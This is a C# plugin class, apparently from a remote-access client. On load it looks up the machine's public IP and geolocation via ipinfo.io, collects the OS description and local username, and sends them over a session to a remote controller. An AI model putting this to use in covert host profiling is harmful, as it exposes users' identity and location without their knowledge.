using Common.Communication;
using Common.DTOs.MessagePack;
using Common.DTOs.Web;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace ClientInfo
{
    public class Plugin
    {
        public Session _session { get; set; }
        public Plugin(Session session)
        {
            _session = session;
            SendClientInfo();
        }
        private async Task SendClientInfo()
        {
            var info = await RetrieveIpInfo();
            var clientInfo = new ClientInfoDTO()
            {
                IPAddress = info.ip,
                Date = "...",
                OS = RuntimeInformation.OSDescription,
                Location = info.loc,
                Version = "debug",
                Username = Environment.UserName,
                Ping = "...",

                Country = info.country,
            };
            await _session.SendPacketAsync(clientInfo);
        }
        private async Task<IpInfo> RetrieveIpInfo()
        {
            using (HttpClient httpClient = new HttpClient())
            {
                var result = httpClient.GetAsync("https://ipinfo.io/json");
                string content = await result.Result.Content.ReadAsStringAsync();
                return JsonSerializer.Deserialize<IpInfo>(content);
            }
        }
    }
}
